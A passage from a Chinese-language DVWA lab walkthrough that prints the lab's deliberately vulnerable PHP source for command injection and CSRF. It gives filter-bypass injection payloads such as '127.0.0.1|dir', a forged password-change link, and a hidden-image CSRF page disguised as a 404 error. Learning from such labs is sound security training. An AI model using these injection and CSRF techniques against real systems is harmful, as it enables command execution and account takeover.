”m”（返回机器类型）。</p></blockquote><p><strong>漏洞利用</strong></p><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p><p>payload：<code>127.0.0.1&amp;&amp;dir</code></p><p><img src="https://s2.ax1x.com/2019/10/04/uD1XG9.png" alt="uD1XG9.png"></p><h4 id="DVWA-Security：medium-1"><a href="#DVWA-Security：medium-1" class="headerlink" title="DVWA Security：medium"></a>DVWA Security：medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>medium级别的代码中，用一个数组替换了**&amp;&amp;<strong>和</strong>;<strong>，但是并没有过滤掉</strong>&amp;**，也可以这样写<code>127.0.0.1&amp;;&amp;dir</code>，再或者使用<code>127.0.0.1|dir</code></p><p>payload：<code>127.0.0.1&amp;dir</code>或者<code>127.0.0.1&amp;;&amp;dir</code></p><p><img src="https://s2.ax1x.com/2019/10/04/uDtdPS.png" alt="uDtdPS.png"></p><p><strong>“&amp;&amp;”和“&amp;”的区别：</strong></p><blockquote><p>ping 127.0.0.1&amp;&amp;dir</p><p>先执行ping 127.0.0.1，执行成功，再执行dir，否则不执行dir</p><p>ping 127.0.0.1&amp;dir</p><p>无论ping 127.0.0.1是否执行成功，都会执行dir</p></blockquote><h4 id="DVWA-Security：high-1"><a href="#DVWA-Security：high-1" class="headerlink" title="DVWA Security：high"></a>DVWA Security：high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>high级别的代码中添加了更严格的过滤，过滤了&amp;、;、| 、-、$、(、)、`、||。</p><p>过滤了”| “（后面多个空格），只要没有空格就可以绕过，就不会被滤掉，</p><p>payload：<code>127.0.0.1|dir</code></p><p><img src="https://s2.ax1x.com/2019/10/04/uD0HZd.png" alt="uD0HZd.png"></p><h4 id="DVWA-Security：impossible"><a href="#DVWA-Security：impossible" class="headerlink" title="DVWA Security：impossible"></a>DVWA Security：impossible</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line">// Get input</span><br><span class="line">$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">$target = stripslashes( $target );</span><br><span class="line">// Split the IP into 4 octects</span><br><span class="line">$octet = explode( &quot;.&quot;, $target );</span><br><span class="line">// Check IF each octet is an integer</span><br><span class="line">if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">// If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">$target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line">// Determine OS and execute the ping command.</span><br><span class="line">if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">// Windows</span><br><span class="line">$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// *nix</span><br><span class="line">$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">&#125;</span><br><span class="line">// Feedback for the end user</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Ops. Let the user name theres a mistake</span><br><span class="line">$html .= &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p><em>stripslashes(string)</em></p><p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p><em>explode(separator,string,limit)</em></p><p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p><p><em>is_numeric(string)</em></p><p>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p><p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p></blockquote><p> <strong>如何测试命令注入</strong></p><p> 总结<br>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。<br>例如，UNIX应用程序列出了使用的文件夹的内容。 它需要的字符串FOLDER_NAME，从用户，没有任何验证，连接到“ls”的建立实际的命令。 应用程序，然后通过命令（“LS FOLDER_NAME “）的系统（）函数，并获取结果。 一个命令注入漏洞，允许攻击者注入额外的命 令在输入字符串FOLDER_NAME的， 其结果是被欺骗应用程序执行攻击者的额外的命 令。<br>为了正确测试命令注入漏洞，应遵循以下步骤：<br> 第1步： 了解攻击场景<br> 第2步： 分析原因及对策<br> 第3步： 开始试验和探索<br> 第4步： 微调测试案例</p><p><a href="https://www.freebuf.com/articles/web/116714.html">参考文章1</a></p><p><a href="https://www.cnblogs.com/blackhat520/p/4207030.html">参考文章</a></p><h3 id="CSRF-Cross-site-request-forgery"><a href="#CSRF-Cross-site-request-forgery" class="headerlink" title="CSRF(Cross-site request forgery)"></a>CSRF(Cross-site request forgery)</h3><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><h4 id="DVWA-security-low"><a href="#DVWA-security-low" class="headerlink" title="DVWA security:low"></a>DVWA security:low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试更改密码</p><p><img src="https://s2.ax1x.com/2019/10/04/urieIK.png" alt="urieIK.png"></p><p>链接变成了<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code></p><p>那么我们可以构造一个CSRF攻击的链接，用同一个浏览器点击这个链接<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code></p><p>就会改掉密码，变成password</p><p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Firefox登录的这个系统，而用Chrome点击这个链接，攻击是不会触发的，因为Chrome并不能利用Firefox的cookie，所以会自动跳转到登录界面。</p><p><img src="https://s2.ax1x.com/2019/10/04/urFiY8.png" alt="urFiY8.png"></p><p>构造攻击页面</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。在本地写一个test.html，下面是具体代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了password</p><p>也可以利用bp抓包之后，利用自带的工具CSRF PoC</p><p><img src="https://s2.ax1x.com/2019/10/08/uffNOf.png" alt="uffNOf.png"></p><p>得到一个脚本文件，复制之后，新建一个.html文件，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/WWW/DVWA/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用同一个浏览器打开，</p><p><img src="https://s2.ax1x.com/2019/10/08/ufTvAf.png" alt="ufTvAf.png"></p><p>点击submit</p><p><img src="https://s2.ax1x.com/2019/10/08/uf7AH0.png" alt="uf7AH0.png"></p><p>成功更改密码。</p><h4 id="DVWA-security：medium"><a href="#DVWA-security：medium" class="headerlink" title="DVWA security：medium"></a>DVWA security：medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eregi(string pattern, string string)</p><p>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。这个函数可使用url二次编码绕过。</p></blockquote><p>使用eregi()函数检查HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），所以referer中必须含有主机地址才行</p><p>使用bp抓包后，</p><p><img src="https://s2.ax1x.com/2019/10/08/uf7L24.png" alt="uf7L24.png"></p><p>可以像上面一样，得到一个脚本文件</p><p><img src="https://s2.ax1x.com/2019/10/08/ufHIQH.png" alt="ufHIQH.png"></p><p>保存成.html文件，访问之后，即可更改密码</p><p><img src="https://s2.ax1x.com/2019/10/08/ufHgdx.png" alt="ufHgdx.png"></p><h4 id="DVWA-security：high"><a href="#DVWA-security：high" class="headerlink" title="DVWA security：high"></a>DVWA security：high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="comment">// Update the 